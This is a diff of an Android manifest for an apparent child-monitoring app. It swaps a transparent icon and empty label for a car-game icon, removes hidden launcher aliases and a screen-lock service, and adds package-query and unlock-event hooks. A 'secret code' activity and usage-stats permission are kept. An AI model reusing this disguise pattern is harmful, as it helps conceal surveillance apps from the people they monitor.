@@ -19,13 +19,14 @@
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
     <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS" tools:ignore="ProtectedPermissions"/>
+    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
 
     <application
         android:name=".ChildApplication"
         android:allowBackup="false"
-        android:icon="@drawable/ic_transparent"
-        android:label="@string/app_name_empty"
-        android:roundIcon="@drawable/ic_transparent"
+        android:icon="@mipmap/ic_car_game"
+        android:label="@string/app_name"
+        android:roundIcon="@mipmap/ic_car_game"
         android:supportsRtl="true"
         android:theme="@style/Theme.ChildApp"
         tools:targetApi="31">
@@ -35,37 +36,12 @@
             android:exported="true"
             android:excludeFromRecents="true"
             android:launchMode="singleTask"
-            android:theme="@style/Theme.ChildApp"
-            android:label="@string/app_name_empty"
-            android:taskAffinity="" />
-            
-        <!-- Activity للـ Launcher (العادية) -->
-        <activity-alias
-            android:name=".LauncherAliasVisible"
-            android:enabled="true"
-            android:exported="true"
-            android:icon="@drawable/ic_launcher"
-            android:label="@string/app_name"
-            android:targetActivity=".MainActivity">
+            android:theme="@style/Theme.ChildApp">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
-        </activity-alias>
-
-        <!-- Activity للـ Launcher (المخفية - أيقونة شفافة) -->
-        <activity-alias
-            android:name=".LauncherAliasHidden"
-            android:enabled="false"
-            android:exported="true"
-            android:icon="@drawable/ic_transparent"
-            android:label="@string/app_name_empty"
-            android:targetActivity=".MainActivity">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
-        </activity-alias>
+        </activity>
 
         <!-- Secret code — Activity (Samsung) + Broadcast -->
         <activity
@@ -129,11 +105,7 @@
             </intent-filter>
         </service>
 
-        <!-- Screen Lock Service -->
-        <service
-            android:name=".service.ScreenLockService"
-            android:enabled="true"
-            android:exported="false" />
+
 
         <!-- Default Notification Channel -->
         <meta-data
@@ -156,6 +128,14 @@
                 android:value="androidx.startup"
                 tools:node="remove" />
         </provider>
+
+        <receiver
+            android:name=".receivers.UserPresentReceiver"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="android.intent.action.USER_PRESENT" />
+            </intent-filter>
+        </receiver>
 
     </application>
 </manifest>
